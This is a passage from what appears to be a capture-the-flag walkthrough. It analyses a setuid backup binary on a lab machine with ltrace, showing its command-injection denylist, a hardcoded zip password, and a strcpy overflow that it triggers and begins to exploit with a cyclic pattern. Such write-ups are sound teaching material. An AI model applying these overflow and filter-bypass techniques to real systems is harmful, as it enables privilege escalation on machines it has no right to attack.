#### Troll

The obvious next step is to backup `/root`. Right at the start I can tell something is different because there’s a message that prints, even in `-q` mode:

```
tom@node:/dev/shm$ backup -q "" /root/ | base64 -d > root.zip
base64: invalid input
tom@node:/dev/shm$ backup -q "" /root                        
 [+] Finished! Encoded backup is below:

UEsDBDMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH/hu0fArpSvYauq4AUycRmLuWvPyJk3sF+HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK/oan4wWPabhw/2rwaaJSXucU+pLgZorY67Q/Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE/ZiS1S+rPgz/e2Pc3lgkQ+lAVBqjo4zmpQltgIXauCdhvlA1Pe/BXhPQBJab7NVF6Xm3207EfD3utbrcuUuQyF+rQhDCKsAEhqQ+Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2EP+Yhgo4OAghyW1sgV8FxenV8p5c+u9bTBTz/7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY/a4AZKO/GtVMULlrpbpIFqZ98zwmROFstmPl/cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO+wXrd/EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MMyU9L1CL2RRwm2QvbdD8PLWA/jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK/kP4F0eR+53a4dSL0b6xFnbL7WwRpcF+Ate/Ut22WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP+jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ+hytQdd26PCuhmRUyNjEIBFx/XqkSOfAhLI9+Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2/F+X/OD+s9xeYniyUrBTEaOWKEv2NOUZudU6X2VOTX6QbHJryLdSU9XLHB+nEGeq+sdtifdUGeFLct+Ee2pgR/AsSexKmzW09cx865KuxKnR3yoC6roUBb30Ijm5vQuzg/RM71P5ldpCK70RemYniiNeluBfHwQLOxkDn/8MN0CEBr1eFzkCNdblNBVA7b9m7GjoEhQXOpOpSGrXwbiHHm5C7Zn4kZtEy729ZOo71OVuT9i+4vCiWQLHrdxYkqiC7lmfCjMh9e05WEy1EBmPaFkYgxK2c6xWErsEv38++8xdqAcdEGXJBR2RT1TlxG/YlB4B7SwUem4xG6zJYi452F1klhkxloV6paNLWrcLwokdPJeCIrUbn+C9TesqoaaXASnictzNXUKzT905OFOcJwt7FbxyXk0z3FxD/tgtUHcFBLAQI/AzMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAAAAAAAAAIIC0gQAAAAByb290LnR4dAGZBwACAEFFAQgAUEsFBgAAAAABAAEAQQAAAB4EAAAAAA==
```

The string does decode to a `.zip` archive, but it’s a different kind of archive, as it doesn’t decompress with `unzip`:

```
tom@node:/dev/shm$ backup -q "" /root | tail -1 | base64 -d > root.zip
tom@node:/dev/shm$ unzip -l root.zip 
Archive:  root.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
     2584  2017-09-02 23:51   root.txt
---------                     -------
     2584                     1 file
tom@node:/dev/shm$ unzip root.zip            
Archive:  root.zip
   skipping: root.txt                need PK compat. v5.1 (can do v4.6)
```

I’ll bring that base64 string back to my vm and uze `7z` to decompress. The file is an ASCII art troll:

```
oxdf@parrot$ cat root.txt 
QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ
QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ
QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ
QQQQQQQQQQQQQQQQQQQWQQQQQWWWBBBHHHHHHHHHBWWWQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ
QQQQQQQQQQQQQQQD!`__ssaaaaaaaaaass_ass_s____.  -~""??9VWQQQQQQQQQQQQQQQQQQQ
QQQQQQQQQQQQQP'_wmQQQWWBWV?GwwwmmWQmwwwwwgmZUVVHAqwaaaac,"?9$QQQQQQQQQQQQQQ
QQQQQQQQQQQW! aQWQQQQW?qw#TTSgwawwggywawwpY?T?TYTYTXmwwgZ$ma/-?4QQQQQQQQQQQ
QQQQQQQQQQW' jQQQQWTqwDYauT9mmwwawww?WWWWQQQQQ@TT?TVTT9HQQQQQQw,-4QQQQQQQQQ
QQQQQQQQQQ[ jQQQQQyWVw2$wWWQQQWWQWWWW7WQQQQQQQQPWWQQQWQQw7WQQQWWc)WWQQQQQQQ
QQQQQQQQQf jQQQQQWWmWmmQWU???????9WWQmWQQQQQQQWjWQQQQQQQWQmQQQQWL 4QQQQQQQQ
QQQQQQQP'.yQQQQQQQQQQQP"       <wa,.!4WQQQQQQQWdWP??!"??4WWQQQWQQc ?QWQQQQQ
QQQQQP'_a.<aamQQQW!<yF "!` ..  "??$Qa "WQQQWTVP'    "??' =QQmWWV?46/ ?QQQQQ
QQQP'sdyWQP?!`.-"?46mQQQQQQT!mQQgaa. <wWQQWQaa _aawmWWQQQQQQQQQWP4a7g -WWQQ
QQ[ j@mQP'adQQP4ga, -????" <jQQQQQWQQQQQQQQQWW;)WQWWWW9QQP?"`  -?QzQ7L ]QQQ
QW jQkQ@ jWQQD'-?$QQQQQQQQQQQQQQQQQWWQWQQQWQQQc "4QQQQa   .QP4QQQQfWkl jQQQ
QE ]QkQk $D?`  waa "?9WWQQQP??T?47`_aamQQQQQQWWQw,-?QWWQQQQQ`"QQQD\Qf(.QWQQ
QQ,-Qm4Q/-QmQ6 "WWQma/  "??QQQQQQL 4W"- -?$QQQQWP`s,awT$QQQ@  "QW@?$:.yQQQQ
QQm/-4wTQgQWQQ,  ?4WWk 4waac -???$waQQQQQQQQF??'<mWWWWWQW?^  ` ]6QQ' yQQQQQ
QQQQw,-?QmWQQQQw  a,    ?QWWQQQw _.  "????9VWaamQWV???"  a j/  ]QQf jQQQQQQ
QQQQQQw,"4QQQQQQm,-$Qa     ???4F jQQQQQwc <aaas _aaaaa 4QW ]E  )WQ`=QQQQQQQ
QQQQQQWQ/ $QQQQQQQa ?H ]Wwa,     ???9WWWh dQWWW,=QWWU?  ?!     )WQ ]QQQQQQQ
QQQQQQQQQc-QWQQQQQW6,  QWQWQQQk <c                             jWQ ]QQQQQQQ
QQQQQQQQQQ,"$WQQWQQQQg,."?QQQQ'.mQQQmaa,.,                . .; QWQ.]QQQQQQQ
QQQQQQQQQWQa ?$WQQWQQQQQa,."?( mQQQQQQW[:QQQQm[ ammF jy! j( } jQQQ(:QQQQQQQ
QQQQQQQQQQWWma "9gw?9gdB?QQwa, -??T$WQQ;:QQQWQ ]WWD _Qf +?! _jQQQWf QQQQQQQ
QQQQQQQQQQQQQQQws "Tqau?9maZ?WQmaas,,    --~-- ---  . _ssawmQQQQQQk 3QQQQWQ
QQQQQQQQQQQQQQQQWQga,-?9mwad?1wdT9WQQQQQWVVTTYY?YTVWQQQQWWD5mQQPQQQ ]QQQQQQ
QQQQQQQWQQQQQQQQQQQWQQwa,-??$QwadV}<wBHHVHWWBHHUWWBVTTTV5awBQQD6QQQ ]QQQQQQ
QQQQQQQQQQQQQQQQQQQQQQWWQQga,-"9$WQQmmwwmBUUHTTVWBWQQQQWVT?96aQWQQQ ]QQQQQQ
QQQQQQQQQQWQQQQWQQQQQQQQQQQWQQma,-?9$QQWWQQQQQQQWmQmmmmmQWQQQQWQQW(.yQQQQQW
QQQQQQQQQQQQQWQQQQQQWQQQQQQQQQQQQQga%,.  -??9$QQQQQQQQQQQWQQWQQV? sWQQQQQQQ
QQQQQQQQQWQQQQQQQQQQQQQQWQQQQQQQQQQQWQQQQmywaa,;~^"!???????!^`_saQWWQQQQQQQ
QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQWWWWQQQQQmwywwwwwwmQQWQQQQQQQQQQQ
QQQQQQQWQQQWQQQQQQWQQQWQQQQQWQQQQQQQQQQQQQQQQWQQQQQWQQQWWWQQQQQQQQQQQQQQQWQ
```

#### Identify Filter

Running this with `ltrace`, after the token check, there’s a `strstr` check with the string `..`, and then with `/root`. `strstr` looks for the second string in the first string. When there’s a match, it prints the finished message and then the “troll”:

```
strstr("/root", "..")                            = nil
strstr("/root", "/root")                         = "/root"
strcpy(0xff96e0f8, "Finished! Encoded backup is belo"...) = 0xff96e0f8
printf(" %s[+]%s %s\n", "\033[32m", "\033[37m", "Finished! Encoded backup is belo"... [+] Finished! Encoded backup is below:

) = 51
puts("UEsDBDMDAQBjAG++IksAAAAA7QMAABgK"...UEsDBDMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH/hu0fArpSvYauq4AUycRmLuWvPyJk3sF+HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK/oan4wWPabhw/2rwaaJSXucU+pLgZorY67Q/Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE/ZiS1S+rPgz/e2Pc3lgkQ+lAVBqjo4zmpQltgIXauCdhvlA1Pe/BXhPQBJab7NVF6Xm3207EfD3utbrcuUuQyF+rQhDCKsAEhqQ+Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2EP+Yhgo4OAghyW1sgV8FxenV8p5c+u9bTBTz/7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY/a4AZKO/GtVMULlrpbpIFqZ98zwmROFstmPl/cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO+wXrd/EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MMyU9L1CL2RRwm2QvbdD8PLWA/jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK/kP4F0eR+53a4dSL0b6xFnbL7WwRpcF+Ate/Ut22WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP+jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ+hytQdd26PCuhmRUyNjEIBFx/XqkSOfAhLI9+Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2/F+X/OD+s9xeYniyUrBTEaOWKEv2NOUZudU6X2VOTX6QbHJryLdSU9XLHB+nEGeq+sdtifdUGeFLct+Ee2pgR/AsSexKmzW09cx865KuxKnR3yoC6roUBb30Ijm5vQuzg/RM71P5ldpCK70RemYniiNeluBfHwQLOxkDn/8MN0CEBr1eFzkCNdblNBVA7b9m7GjoEhQXOpOpSGrXwbiHHm5C7Zn4kZtEy729ZOo71OVuT9i+4vCiWQLHrdxYkqiC7lmfCjMh9e05WEy1EBmPaFkYgxK2c6xWErsEv38++8xdqAcdEGXJBR2RT1TlxG/YlB4B7SwUem4xG6zJYi452F1klhkxloV6paNLWrcLwokdPJeCIrUbn+C9TesqoaaXASnictzNXUKzT905OFOcJwt7FbxyXk0z3FxD/tgtUHcFBLAQI/AzMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAAAAAAAAAIIC0gQAAAAByb290LnR4dAGZBwACAEFFAQgAUEsFBgAAAAABAAEAQQAAAB4EAAAAAA==
)      = 1525
exit(0 <no return ...>
+++ exited (status 0) +++
```

In fact, that troll message is hardcoded into the binary:

```
tom@node:/dev/shm$ strings /usr/local/bin/backup | grep UEsDBDMDAQB
UEsDBDMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH/hu0fArpSvYauq4AUycRmLuWvPyJk3sF+HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK/oan4wWPabhw/2rwaaJSXucU+pLgZorY67Q/Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE/ZiS1S+rPgz/e2Pc3lgkQ+lAVBqjo4zmpQltgIXauCdhvlA1Pe/BXhPQBJab7NVF6Xm3207EfD3utbrcuUuQyF+rQhDCKsAEhqQ+Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2EP+Yhgo4OAghyW1sgV8FxenV8p5c+u9bTBTz/7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY/a4AZKO/GtVMULlrpbpIFqZ98zwmROFstmPl/cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO+wXrd/EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MMyU9L1CL2RRwm2QvbdD8PLWA/jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK/kP4F0eR+53a4dSL0b6xFnbL7WwRpcF+Ate/Ut22WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP+jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ+hytQdd26PCuhmRUyNjEIBFx/XqkSOfAhLI9+Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2/F+X/OD+s9xeYniyUrBTEaOWKEv2NOUZudU6X2VOTX6QbHJryLdSU9XLHB+nEGeq+sdtifdUGeFLct+Ee2pgR/AsSexKmzW09cx865KuxKnR3yoC6roUBb30Ijm5vQuzg/RM71P5ldpCK70RemYniiNeluBfHwQLOxkDn/8MN0CEBr1eFzkCNdblNBVA7b9m7GjoEhQXOpOpSGrXwbiHHm5C7Zn4kZtEy729ZOo71OVuT9i+4vCiWQLHrdxYkqiC7lmfCjMh9e05WEy1EBmPaFkYgxK2c6xWErsEv38++8xdqAcdEGXJBR2RT1TlxG/YlB4B7SwUem4xG6zJYi452F1klhkxloV6paNLWrcLwokdPJeCIrUbn+C9TesqoaaXASnictzNXUKzT905OFOcJwt7FbxyXk0z3FxD/tgtUHcFBLAQI/AzMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAAAAAAAAAIIC0gQAAAAByb290LnR4dAGZBwACAEFFAQgAUEsFBgAAAAABAAEAQQAAAB4EAAAAAA==
```

When I run it on `/dev/shm`, there are more checks:

```
strstr("/dev/shm", "..")                         = nil
strstr("/dev/shm", "/root")                      = nil
strchr("/dev/shm", ';')                          = nil
strchr("/dev/shm", '&')                          = nil
strchr("/dev/shm", '`')                          = nil
strchr("/dev/shm", '$')                          = nil
strchr("/dev/shm", '|')                          = nil
strstr("/dev/shm", "//")                         = nil
strcmp("/dev/shm", "/")                          = 1 
strstr("/dev/shm", "/etc")                       = nil
```

The fact that `/` matches doesn’t seem to mess things up. I did try with the other characters, but they did generate the troll, which blocks almost every attempt I had at command injection (see [Beyond Root](https://0xdf.gitlab.io/2021/06/08/htb-node.html#shell-via-command-injection) for the one that worked).

#### Generate Output

After all the checks, it copies the input into a new buffer (with `strcpy`), creates a temp filename using `time` as a seed to generate a random number, and then calls `system` to create the zip:

```
strcpy(0xfff31dbb, "/dev/shm")                   = 0xfff31dbb
getpid()                                         = 1925 
time(0)                                          = 1622641188
clock(0, 0, 0, 0)                                = 1721
srand(0x747ef1b2, 0x534950d0, 0x747ef1b2, 0x804918c) = 0
rand(0, 0, 0, 0)                                 = 0xf49e894
sprintf("/tmp/.backup_256501908", "/tmp/.backup_%i", 256501908) = 22
sprintf("/usr/bin/zip -r -P magicword /tm"..., "/usr/bin/zip -r -P magicword %s "..., "/tmp/.backup_256501908", "/dev/shm") = 72
system("/usr/bin/zip -r -P magicword /tm"... <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                           = 0
```

Then it base64 encodes that file with another `system` call and deletes the file:

```
access("/tmp/.backup_256501908", 0)              = 0
sprintf("/usr/bin/base64 -w0 /tmp/.backup"..., "/usr/bin/base64 -w0 %s", "/tmp/.backup_256501908") = 42
system("/usr/bin/base64 -w0 /tmp/.backup"...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 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                           = 0
remove("/tmp/.backup_256501908")                 = 0
```

I looked more closely at if I could predict the filename, but [I could not](https://0xdf.gitlab.io/2021/06/08/htb-node.html#predict-filename---fail).

### BOF

#### Enumerate

In looking through the `ltrace` output, I noticed a `strcpy` involving the file path to backup when there’s no `-q`:

```
strcmp("/dev/shm", "/")                          = 1 
strstr("/dev/shm", "/etc")                       = nil
strcpy(0xfffb1ecb, "/dev/shm")                   = 0xfffb1ecb
getpid()                                         = 2374
```

That’s my input being copied into a buffer without a length limit. I’ll test it by sending in a long path:

```
tom@node:/$ backup -q "" $(python -c 'print "A"*2000')
Segmentation fault (core dumped)
```

That looks like a buffer overflow.

#### Run Locally

To get the buffer’s offset to EIP, I’ll run it in `gdb`, which isn’t on Node. I’ll use `nc` to send it back to my VM. Trying to run it will actually fail with a new error:

```
oxdf@parrot$ ./backup a '' '/dev/shm'
...[snip]...
 [!] Could not open file
```

This is actually the failure of trying to open `/etc/myplace/keys`. If I create that file with an empty line (so that blank key will work), then I can run it and it will work:

```
oxdf@parrot$ ./backup a '' '/dev/shm'
...[snip]...
 [+] Validated access token
 [+] Validated access token
 [+] Starting archiving /dev/shm
zip warning: Permission denied
 [+] Finished! Encoded backup is below:

UEsDBAoAAAAAAPdzulIAAAAAAAAAAAAAAAAIABwAZGV2L3NobS9VVAkAAxGUrmAsM7hgdXgLAAEEAAAAAAQAAAAAUEsBAh4DCgAAAAAA93O6UgAAAAAAAAAAAAAAAAgAGAAAAAAAAAAQAP9DAAAAAGRldi9zaG0vVVQFAAMRlK5gdXgLAAEEAAAAAAQAAAAAUEsFBgAAAAABAAEATgAAAEIAAAAAAA==
```

#### Find Offset

I’ll use `msf-pattern_create`, but I need to give it custom sets or else it will include special characters that trigger the denylist checks:

```
oxdf@parrot$ msf-pattern_create -l 1000 -s ABCDEFGHIJKLMNOPQRSTUVWXYZ,abcdefghijklmnopqrstuvwxyz,0123456789
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B
```

I’ll run `gdb` to debug the program, and pass in the pattern as the third arg:

```
